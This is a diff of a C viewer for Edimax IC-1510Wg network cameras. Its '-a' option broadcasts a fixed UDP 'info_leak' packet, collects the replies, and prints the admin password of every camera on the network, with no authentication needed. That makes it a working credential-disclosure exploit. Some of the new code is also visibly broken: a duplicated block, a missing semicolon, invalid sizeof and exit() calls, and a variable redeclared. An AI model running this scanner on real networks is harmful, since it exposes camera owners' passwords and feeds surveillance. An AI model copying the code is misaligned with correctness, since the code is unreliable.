@@ -1,6 +1,6 @@
 /*
 * util to get pictures from Edimax IC-1510Wg as video
-* alpha 0.022
+* alpha 0.023
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
@@ -8,10 +8,12 @@
 +
 * authors:
 * (C) 2010  Thorben Went <info at dokumenteundeinstellungen dot de>
-* (C) 2010  m0x <unkown>
+* (C) 2010  m0x <m0x_ru@mail.ru>
 *
 */
 
+#include <stdarg.h>
+#include <getopt.h>
 #include <ctype.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -25,32 +27,87 @@
 #include <signal.h>
 #include "display.h"
 
+/* default ip */
 #define IP "192.168.178.25"
-#define PORT 4321 /*default video-port is 4321*/
-#define LOGIN_SIZE 120 /*size of login-packet*/
+/* default video port */
+#define PORT 4321
+/* #define LOGIN_SIZE 120 size of login-packet, no longer used */
+/* buffer size */
 #define PICP_SIZE 30000 
-#define VERSION "alpha 0.02"
+#define VERSION "alpha 0.03"
 
+/*
+  since the camera sends 3 responses, this is used to filter unnecessary
+  responses.
+*/
+struct iplinkedlist{
+  struct iplinkedlist* next;
+  char ip[16];
+}
 
-int offset;
-char picbuffer[PICP_SIZE];
-
-void error(const char * str){
-	printf("%s\n", str);
+/*
+  this works similar to printf
+  it prints the message and does some cleanup
+*/
+void error(const char * str, ...){
+  va_list args;
+  va_start(args, str);
+  vprintf(str, args);
+  va_end(args);
 	fflush(stdout);
-	close_display();
+	close_display();/*mimii*/
 	exit(1);
 }
 
+/*
+  sometimes update_display doesn't recognize sigint well when
+  i/o blocks
+*/
+void sigintfix(int sig){
+	if(sig == SIGINT)
+		error("Killed");
+}
 
+/*
+  
+*/
+void show_help(char *argv[]) {
+	printf("Edimax Video-Viewer %s\n\n",VERSION);
+	printf("Usage:\n");
+	printf("%s [Option] [IP]\n\n",argv[0]);
+	printf("Options:\n");
+	printf("-s\tSnapshot, write one picture to file\n");
+	printf("-a\tLooks for the admin-pw of all devices\n");
+	printf("-h\tYou are currently looking at it\n\n");
+	printf("IP:\n");
+  printf("\tIf you don't specify an ip\n");
+  printf("\twe'll default to \"192.168.178.25\"\n\n");
+  printf("Without options the binary will output\n");
+	printf("a pseudo-video by requesting pic by pic.\n");
+}
+
+/*
+  broadcast request to all cams reachable,
+  we only allow 1 response from each camera.
+  it was already mentioned in the readme that the design of
+  the camera is funny/studid because it responses with a broadcast
+  AND exposes the admin password and other sensitiv stuff when 
+  requested. (no authentication required)
+*/
 void udp_get(void) {
-	int sockfd, n, i = 0;
-	struct sockaddr_in dest, fromcam; // connector's address information
-	struct hostent *he;
+	int sockfd, n, i = 0, cameras = 0;
+	struct sockaddr_in dest, fromcam; /*connector's address information*/
+  struct timeval tval;/*receive timeout*/
 	size_t addr_len;
 	int broadcast = 1;
-	char text[623], *passwd, *name;
+	char text[623], passwd[512], name[512], *ip;
 	FILE *file;
+  struct iplinkedlist root;/*list of ip's that already responded*/
+
+  root.next = NULL;
+
+  tval.tv_sec = 2;
+  tval.tv_usec = 0;
 
 	char info_leak[] = { 0x00, 0x1f, 0x1f, 0x61, 0xb7, 0xfa, 0x00, 0x02, 0xff, 0xfd };
 
@@ -63,6 +120,9 @@ void udp_get(void) {
 	
 	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &broadcast, sizeof broadcast) == -1)
 		error("setsockopt (SO_REUSEADDR)\n");
+  
+  if(setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tval, sizeof tval) == -1)
+    error("setsockopt (SO_RCVTIMEO)\n");
 
 	dest.sin_family = AF_INET;     // host byte order
 	dest.sin_port = htons(13364); // short, network byte order
@@ -72,65 +132,139 @@ void udp_get(void) {
 	if (bind(sockfd, (struct sockaddr *) &dest, sizeof(dest)) == -1) /* we want source and dest-port to be 13364 */
 		error("Bind\n");
 
+  printf("scanning...\n");
 	if ((n=sendto(sockfd, info_leak, sizeof(info_leak), 0, (struct sockaddr *)&dest, sizeof dest)) == -1)
 		error("sendto\n");
 
 	/* printf("sent %d bytes to %s\n", n, inet_ntoa(dest.sin_addr)); */
-	addr_len = sizeof fromcam;	
-	for (i = 0; i < 2; i++) { /* 1. recv get our own packet back. we need the 2. packet */
+  while(1)
+  {
+    addr_len = sizeof fromcam;	
 		memset(text, 0, sizeof(text));
-		n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
-	}
-	close(sockfd);
-	/* file = fopen("debuf","w");
-	fwrite(text,sizeof(text[0]),n,file);
-	fclose(file); */
-	/* printf("Read %i bytes of broadcast data\n", n); */
+		
+    n = recvfrom(sockfd, text, sizeof(text), 0, (struct sockaddr *)&fromcam, &addr_len);
+    if(n<1)/*most likely: connection timeout*/
+      break;
+    ip = inet_ntoa(fromcam.sin_addr);
 
-        /* get len of camname...*/
-        n = strlen(text+170);
-        /* to malloc this len to passwd */
-        name = malloc(n);
-        /* then copy string from packet */
+    /*check if we already got a response from the peer*/
+    struct iplinkedlist* ptr = &root;
+    int proceed = 1;
+    while(ptr->next)
+    {
+      ptr = ptr->next;
+      if(!strcmp(ptr->ip, ip))
+      {  
+        proceed = 0;/*already got response, try next response*/
+        break;
+      }
+    }
+    if(!proceed)
+      continue;
+
+    /*if not add it to the list*/
+    ptr->next = malloc(sizeof iplinkedlist);
+    ptr->next->next = NULL;
+    strncpy(ptr->next->ip, ip ,15);
+    ip[15]='\0';
+
+    if(memcmp(text, info_leak, sizeof info_leak)) 
+    /*matches all responses except ours
+      since our request gets received by ourselves too 
+      (we listen on the same port that we broadcast to*/
+    {
+      /*check if we already got a response from the peer*/
+      struct iplinkedlist* ptr = &root;
+      int proceed = 1;
+      while(ptr->next)
+      {
+        ptr = ptr->next;
+        if(!strcmp(ptr->ip, ip))
+        {  
+          proceed = 0;/*already got response, try next response*/
+          break;
+        }
+      }
+      if(!proceed)
+        continue;
+
+      /*if not add it to the list*/
+      ptr->next = malloc(sizeof iplinkedlist);
+      ptr->next->next = NULL;
+      strncpy(ptr->next->ip, ip ,15);
+      ip[15]='\0';
+
+      /*now, parse the received data*/
+      if(n<=333)/*not enough data ;)*/
+        continue;
+
+      char *ptr = text+170;
+      int offset =0;
+
+      //filter cam name
+      while(*ptr && (ptr-text<n) && (ptr-text-170<sizeof name))/*only write to memory allowed to write to*/
+      {
+        name[offset] = *ptr;
+        offset++;
+        ptr++;
+      }
+      name[offset]='\0';
+      
+      //filter password
+      ptr = text+333;
+      offset = 0;
+      
+      while(*ptr && (ptr-text<n) && (ptr-text-333<sizeof passwd))/*only write to memory allowed to write to*/
+      {
+        passwd[offset] = *ptr;
+        offset++;
+        ptr++;
+      }
+      passwd[offset] = '\0';
+
+      /*print password, cam name and so on*/
+      printf("password for cam `%s'(%s) is '%s'\n", name, ip, passwd);
+      cameras++;
+    }
+	}
+  printf("done, found %i cameras.\n", cameras);
+	close(sockfd);
+/* 
+        * get len of camname...*
+        n = strlen(text+170);   //this could run forever if there is no nullbyte, could count mem outside buffer
+        * to malloc this len to passwd *
+        name = malloc(n);       //could alloc more than needed
+        * then copy string from packet *
         strcpy(name, text+170);
 
-	/* get len of passwd...*/
+	* get len of passwd...*
 	n = strlen(text+333);
-	/* to malloc this len to passwd */
+	* to malloc this len to passwd *
 	passwd = malloc(n);
-	/* then copy string from packet */
+	* then copy string from packet *
 	strcpy(passwd, text+333);
 	printf("Password for Cam %s(%s) is: %s\n", name, inet_ntoa(fromcam.sin_addr), passwd);
-
+*/
+  /*remember to free the ip linked list, when you remove this exit*/
 	exit(0);
 }
 
-
-void sigintfix(int sig){
-	if(sig == SIGINT)
-		error("Killed");
-}
-
-void show_help(char *argv[]) {
-	printf("Edimax Video-Viewer %s\n\n",VERSION);
-	printf("Usage:\n");
-	printf("%s [Option]\n\n",argv[0]);
-	printf("Options:\n");
-	printf("-s\tSnapshot, write one picture to file\n");
-	printf("-a\tLooks after the admin-pw of device\n");
-	printf("-h\tYou currently looking at it\n\n");
-	printf("Without options the binary will output\n");
-	printf("a pseudo-video by requesting pic by pic.\n");
-}
-
-void pic_req(int sockfd) {
+/*
+  receives an image from `sockfd'
+    picbuffer = destination buffer
+    maxlen = destination buffer len
+    sockfd = socket descriptor
+  return value: image end offset in destination buffer
+    -1 on error
+*/
+int pic_req(int sockfd, char *picbuffer, int len) {
 	char recbuffer[PICP_SIZE];
-
+ 
 	int loop = 1,
+      offset = 0,
 	    n = 0,
 	    i = 0;
 
-	offset = 0;
 	char picrp[] = { /*picture request packet: 4. byte (0x0e)*/
 	0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x00, 
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
@@ -149,33 +283,33 @@ void pic_req(int sockfd) {
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
 	memset(&recbuffer, 0, sizeof(recbuffer));
-	memset(&picbuffer, 0, sizeof(picbuffer));
+	memset(picbuffer, 0, len);
  
 	if((n = write(sockfd, picrp, sizeof(picrp))) == -1 )
 		error("Error while write picrp");
 	
 	while(loop)
 	{
-		if ((n = recv(sockfd, recbuffer, PICP_SIZE ,0)) == -1)
-			error("Error while read picr-answer");
-		/*if(PICP_SIZE-offset<n)
+		if ((n = recv(sockfd, recbuffer, sizeof recbuffer, 0))<1)
+			error("Error while read picr-answer\n");
+		if(len-offset<n)/*this is important since it protects us against buf overflows*/
 		{
-			memcpy(picbuffer+offset,recbuffer, PICP_SIZE-offset);
-			offset+=PICP_SIZE-offset;
-		} else {*/  
+			memcpy(picbuffer+offset,recbuffer, len-offset);
+			offset=len;
+		} else {
 			memcpy(picbuffer+offset,recbuffer, n);
 			offset += n;
-		/*}*/
+		}
 		if(offset>1 && picbuffer[offset-2] == (char)0xff && picbuffer[offset-1] == (char)0xd9)
 			loop=0;
 
-		if(loop && offset == PICP_SIZE) 
-		{
+		if(loop && offset >= PICP_SIZE) 
+		{/*this should NOT happen*/
 			printf("buffer filled but no valid jpeg arrived!\n");
-			return;
+			return -1;
 		}
 	}
-	
+  return offset;
 }
 
 /* Login-Packet for first tests. Hardcoded username 1 with password muh 
@@ -210,46 +344,61 @@ int login_cam(int sockfd) {
 
 
 int main(int argc, char *argv[]) {
-	int len, sockfd, login, c, snap = 0;
+	int len, sockfd, login, c, snap = 0, port = PORT;
 	struct sockaddr_in dest;
+  char ip[16]="";
+  char picbuffer[PICP_SIZE];
 	FILE *file;
 	int res;
+  
+	while ((c = getopt (argc, argv, "sahp:")) != -1)
+	  switch (c){
+      case 'p':
+        port = atoi(optarg);
+        break;
+	    case 's':
+		    snap = 1;
+		    break;
+	    case 'a':
+		    udp_get();
+		    /*printf("Adminpw lookup not included yet\n"); *//* now included ;) */
+		    exit(0);
+        break;
+	    case 'h':
+      default:
+		    show_help(argv);
+		    exit(0);
+		    break;
+	  }
 
+  if(optind >= argc)
+  {
+    printf("No ip specified, defaulting to: %s\n", IP);
+    strncpy(ip, IP, 15);
+  }
+  else
+  {
+    strncpy(ip, argv[optind], 15);
+  }
+  ip[15]='\0';
+  
+	/*printf("PID: %d\n", getpid(), ip);*/
 
-	while ((c = getopt (argc, argv, "sah")) != -1)
-	switch (c){
-	case 's':
-		snap = 1;
-		break;
-	case 'a':
-		udp_get();
-		break;
-	case 'h':
-		show_help(argv);
-		exit(0);
-		break;
-	}
-
-	if (!snap)
-	{/* FIX: Add option to define other resolutions*/
-		res = init_display(320,240); 
-		printf("PID: %d\n", getpid());
-	}
-
+  /*fixes some issues*/
 	signal(SIGINT, sigintfix);
 
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	
 	if(sockfd == -1)
-	error("Error while creating socket..\n");
+	  error("Error while creating socket..\n");
 	
 	memset(&dest, 0, sizeof(dest));
 	dest.sin_family = AF_INET;
-	dest.sin_addr.s_addr = inet_addr(IP); /* set destination IP number */ 
-	dest.sin_port = htons(PORT);                /* set destination port number */
+	dest.sin_addr.s_addr = inet_addr(ip); /* set destination IP number */ 
+	dest.sin_port = htons(port);          /* set destination port number */
 
 	if (connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr)) == -1)
-		error("Error while connecting to "IP);
+		error("Error while connecting to %s:%i\n", ip, port);
 		
   /*
 	if ((login=login_cam(sockfd)) == -1){ 
@@ -260,24 +409,38 @@ int main(int argc, char *argv[]) {
 		printf("Login success!\n");
 	}*/
   
-        if (snap) {
-		file = fopen("snapshot.jpg","w");
-                pic_req(sockfd);
-		fwrite(picbuffer+28,sizeof(picbuffer[0]),offset-28,file);
-		fclose(file);
-                exit(0);
-        } else {
-	        /* main-loop for pseudo-video*/
-		while(1) {
-			pic_req(sockfd);
-        		show_jpegmem(picbuffer+28, offset-28);
-			
-			if(update_display() == -1) /* SIGINT will be handled by update_display*/
-				exit(0);
-		}
-	}
-        /* FIX: Add option to choice write and display writen file
-        show_jpegfile("file.jpg");*/
+  if (snap) {
+    file = fopen("snapshot.jpg","w");
+    len = pic_req(sockfd, picbuffer, sizeof picbuffer);
+    if(len == -1 || len <30)
+      error("Failed to get picture from cam\n");
 
+    fwrite(picbuffer+28,sizeof(picbuffer[0]),len-28,file);
+	  fclose(file);
+    exit(0);
+  } else {
+    /* FIX: Add option to define other resolutions
+       or extract it from the picture response
+       e.g. put this in the following loop when the 
+       resolution is found in the response
+    */
+    res = init_display(320,240); 
+	  if(res == -1)
+      exit("init_display failed!\n");
+
+    /* main-loop for pseudo-video*/
+	  while(1) {
+		  len = pic_req(sockfd, picbuffer, sizeof picbuffer);
+      if(len == -1 || len < 30)
+      {
+        printf("Getting picture from cam failed.. retrying\n");
+        continue;
+      }
+      show_jpegmem(picbuffer+28, len-28);
+			
+		  if(update_display() == -1) /* SIGINT will be handled by update_display*/
+			  exit(0);
+	  }
+	}
 	return 0;
 }
